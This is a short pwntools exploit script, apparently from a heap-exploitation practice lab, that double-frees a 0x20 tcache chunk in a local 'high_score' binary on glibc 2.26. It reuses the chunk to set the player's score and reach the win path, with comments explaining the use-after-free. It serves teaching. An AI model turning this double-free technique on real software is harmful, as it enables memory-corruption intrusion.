from pwn import * 

mode = 'DEBUG' # Turn on gdb
libc_name='../../../libc_versions/2.26/libc-2.26.so'
env = {}

# Binary setup
elf_name = './.high_score'

elf = ELF(elf_name)
if libc_name != '':
        libc = ELF(libc_name)
        env = {"LD_PRELOAD": libc.path}

# Process creation 
if mode == 'DEBUG':
        p = process([elf.path],env=env)
        gdb.attach(p, gdbscript='''
dir ../../../libc_versions/2.26/
''')


def create(name):
	p.sendlineafter(">", "malloc")
	p.sendlineafter(":", name)

def reset():
	p.sendlineafter(">", "free") 

def won(): 
	p.sendlineafter(">", "won") 

def new():
	p.sendlineafter(">", "play") 


# Create the user :) <--- Create a 0x20 tcache chunk
create("Max") 

'''
Remove the user <---- Free a 0x20 tcache chunk
Triggers the use-after-free (UAF) on the 'struct' used for authorization.

Now, the next 0x20 tcache allocation will USE this chunk. Additionally, 
FREE it again. 

With the same chunk being freed TWICE, it can then be ALLOCATED TWICE. 

So, the tcache looks like the following, after these two frees: 
0x20: chunk1 -> chunk1

The tcache now has TWO chunks that are the SAME!
'''
reset()
reset() 
'''
Create a NEW user. The fastbin now looks like the following: 
0x20: chunk1 

The 'user struct' now has chunk 1 in a different allocation.
'''
create("TWO") 

'''
Play the game <--- Reallocates the malloc chunk used in the previous allocation

The 'new' function plays a game that allocates a 'malloc' chunk of size 0x20 fastbin. 
This will use the SAME allocation from the chunk that we just 'freed'!
This adds the following values to the struct: 
- 100, 101, 102, 103

The FOURTH item of the player struct (player->score) will be set to 103. 

The double free essentially creates a UAF, as with the previous challenge. 
'''
new()
won()

p.interactive()
